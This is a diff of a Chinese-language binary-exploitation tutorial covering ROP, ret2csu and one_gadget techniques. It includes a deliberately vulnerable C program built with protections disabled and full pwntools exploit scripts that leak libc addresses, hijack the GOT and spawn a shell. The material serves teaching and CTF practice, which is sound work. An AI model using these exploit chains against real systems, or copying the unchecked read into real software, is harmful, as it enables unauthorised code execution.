+# 通过ROP运行system(cmd)
+do_rop(p32(system) + p32(0xdeadbeef) + p32(bss))
 
-
- p = process('./level2')
- #p = remote('127.0.0.1', 10002)
-
- d = DynELF(leak, elf=ELF('./level2'))
-
- system_addr = d.lookup('system', 'libc')
- print "system_addr=" + hex(system_addr)
-
- bss_addr = 0x0804a020
- pppr = 0x804855d
-
- payload2 = 'a'*140 + p32(plt_read) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8) 
- payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr)
- #ss = raw_input()
-
- print "\n###sending payload2 ...###"
- p.send(payload2)
- p.send("/bin/sh\0")
-
- p.interactive()
+p.interactive()
 ```
+
 
 
 
@@ -1630,6 +1778,8 @@ p.interactive()
 通常执行system("/bin/sh")需要在调用system之前传递参数；
 比较神奇的是，libc中包含一些gadget，直接跳转过去即可启动shell；
 通常通过寻找字符串"/bin/sh"的引用来寻找(对着/bin/sh的地址在IDA Pro中按X)
+
+> 由于调用约定限制，one_gadget在32位上约束条件通常比在64位上更复杂，所以64位上利用起来更方便。具体原因细节可参考[链接](https://xz.aliyun.com/t/2720)
 
 ```
 000000000003F76A  mov     rax, cs:environ_ptr_0
@@ -1683,18 +1833,96 @@ constraints:
 **案例：onegadget**
 
 ```
-int __cdecl main(int argc, const char **argv, const char **env)
-{
-   char buf[112]; // [rsp+0h] [rbp-70h]
+//gcc bof.c -fno-stack-protector -no-pie -obof
+#include <unistd.h>
 
-   setvbuf(stdin, 0LL, 2, 0LL);
-   setvbuf(stdout, 0LL, 2, 0LL);
-   setvbuf(stderr, 0LL, 2, 0LL);
-   puts("Welcome to ret2libc demo!");
-   printf("This is your gift: %p\n", &setvbuf);
-   read(0, buf, 0x100uLL);
-   return 0;
+int main(int argc, char *argv[])
+{
+    char buf[32];
+    write(1, "PWNME\n", 6);
+    read(0, buf, 512);
+    return 0;
 }
+```
+
+找到的onegadget条件是r15和r12都为0即可，刚好ret2csu末尾的pop ret可以用来控制寄存器，就不用额外找popret gadget了。
+
+同样也利用了got hijack，在一次溢出中完成了攻击，通过两个连续的ret2csu先调用write@got泄露的write@got，然后调用read@got覆写write@got为one_gadget，最终再调用write@plt触发onegadget。其中第一次ret2csu结尾的popret也利用起来了为第二次ret2csu准备参数，同样第二次ret2csu结尾的popret则为onegadget构造条件将r15和r12寄存器置为0，完成整个攻击。
+
+另外注意可覆写的缓存区长度是否足够放下构造的ROP，由于该ROP构造链较长，又是64位，故payload长度相对长一些，而程序中允许的最长payload是512字节是足够的，如果程序中读入字节数较少，则可以考虑stack pivot扩展栈空间，或多次溢出来减少payload长度。
+
+整个Exploit如下：
+
+```
+#!/usr/bin/env python
+
+from pwn import *
+context.log_level = 'debug'
+
+elf = ELF('./bof')
+libc = elf.libc
+p = process(elf.path)
+pause()
+
+'''
+0xe6c7e execve("/bin/sh", r15, r12)
+constraints:
+ [r15] == NULL || r15 == NULL
+ [r12] == NULL || r12 == NULL
+'''
+'''
+0x00000000004011e0 <+64>:  mov  rdx,r14
+0x00000000004011e3 <+67>:  mov  rsi,r13
+0x00000000004011e6 <+70>:  mov  edi,r12d
+0x00000000004011e9 <+73>:  call  QWORD PTR [r15+rbx*8]
+0x00000000004011ed <+77>:  add  rbx,0x1
+0x00000000004011f1 <+81>:  cmp  rbp,rbx
+0x00000000004011f4 <+84>:  jne  0x4011e0 <__libc_csu_init+64>
+0x00000000004011f6 <+86>:  add  rsp,0x8
+0x00000000004011fa <+90>:  pop  rbx
+0x00000000004011fb <+91>:  pop  rbp
+0x00000000004011fc <+92>:  pop  r12
+0x00000000004011fe <+94>:  pop  r13
+0x0000000000401200 <+96>:  pop  r14
+0x0000000000401202 <+98>:  pop  r15
+0x0000000000401204 <+100>:  ret
+'''
+
+onegadget = 0xe6c7e
+ret2csu_gadget1 = 0x4011e0
+ret2csu_gadget2 = 0x4011f6
+
+p.recvuntil('PWNME\n')
+payload = b'A' * 40
+payload += p64(ret2csu_gadget2)
+payload += p64(0)
+payload += p64(0) # rbx
+payload += p64(1) # rbp
+payload += p64(1) # r12,edi
+payload += p64(elf.got['write']) # r13, rsi
+payload += p64(8) # r14, rdi
+payload += p64(elf.got['write']) # r15
+payload += p64(ret2csu_gadget1)
+payload += p64(0)
+payload += p64(0) # rbx
+payload += p64(1) # rbp
+payload += p64(0) # r12,edi
+payload += p64(elf.got['write']) # r13, rsi
+payload += p64(8) # r14, rdi
+payload += p64(elf.got['read']) # r15
+payload += p64(ret2csu_gadget1)
+payload += p64(0) * 7
+payload += p64(elf.plt['write'])
+p.send(payload)
+sleep(1)
+
+write_addr = u64(p.recv(8))
+print('write_addr = {}'.format(hex(write_addr)))
+libbase = write_addr - libc.sym['write']
+onegadget_addr = libbase + onegadget
+
+p.send(p64(onegadget_addr))
+p.interactive()
 ```
 
 
@@ -1965,4 +2193,6 @@ payload = "\x00"*136 + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr)
   docker image ls
   swpwn attach
   https://github.com/Escapingbug/ancypwn
+- https://blog.r0kithax.com/ctf/infosec/2020/10/20/rop-emporium-ret2csu-x64.html
+- glibc里的one gadget https://xz.aliyun.com/t/2720
 
